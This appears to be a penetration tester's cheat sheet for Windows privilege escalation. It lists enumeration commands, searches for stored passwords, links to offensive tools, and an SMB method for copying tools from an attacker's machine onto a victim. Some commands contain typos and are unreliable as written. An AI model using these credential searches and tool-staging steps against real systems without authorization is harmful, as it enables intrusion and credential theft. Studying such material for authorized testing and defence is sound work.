## Initial Enumeration
**System Enumeration**
- `systeminfo`
- `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
- Extract Patching: `wmic qfe` 
	- `wmic qfe get Caption,Description,HotFixID,InstalledOn`
- Logical Disk: `wmic logicaldisk`

**User Enumeration**
- View current privilege: `whoami /priv`
- Enumerate groups: `whoami /groups`
- Enumerate users on machine: `net user`
- View users details: `net user <username>`
- Enumerate group: `net localgroup`
- Enumerate specific group: `net localgrop <groupname>`

**Network Enumeration**
- `ipcofig`
- `ipconfig /all`
- If it is on AD, we can get DC which is configured as DNS server 
- `arp -a` : If there is another IP on the table, enumerate it as well. How is that IP is communicating to our machine.
- Routing table: `route print` 
- Sometimes we don't need to elevate but we need to pivot to another machine to grab the privileges.
- `netstat -ano`: See what's port are out there. It might show the ports which are not shown during the scanning.

**Password Hunting**
- `findstr /si password *.txt`
- `findstr /si password *.txt *.ini *.config *.sql`
- Find all those strings in config files.
	- `dir /s "pass" == "cred" == "vnc" == ".config"`
- Find all passwords in all files..
	- `findstr /spin "password" "."`
- More ways to find passwords in different files [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---looting-for-passwords)

**AV Enumeration**
- View windows defender: `sc query windefend`
- View what are the service (to view antivirus running): `sc queryex type=service`
- View firewall state
	- `netsh advfirewall firewall dump`
	- `netsh firewall show state`
- View firewall config
	- `firewall show config`

## Exploring Automated Tools
**Some Automated Tools**
- WinPEAS - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
- Windows PrivEsc Checklist - https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
- Sherlock - https://github.com/rasta-mouse/Sherlock
- Watson - https://github.com/rasta-mouse/Watson
- PowerUp - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- JAWS - https://github.com/411Hall/JAWS
- Windows Exploit Suggester - https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- Metasploit Local Exploit Suggester - https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/
- Seatbelt - https://github.com/GhostPack/Seatbelt
- SharpUp - https://github.com/GhostPack/

**Tools Delivery**
- Create a SMB Server in you machine.
- `impacket-smbserver.py <shareName> <sharePath> -smb2support`
	- where, shareName is the name to which SMB will be connected and sharePath is the directory to which attacker is hosting, '.' to host current directory.
- In victim machine,
- Connect
	- `net use \\[host]\[shareName]`
- Copy the file to victim
	- `copy \\[host]\[shareName]\tools.exe \windows\temp\a.exe`
- Close the connection
	- `net use /d \\[host]\[shareName]`
- For more ways to transfer the files: https://medium.com/@dr.spitfire/ocsp-file-transfer-recipe-for-delicious-post-exploitation-a407e00f7346


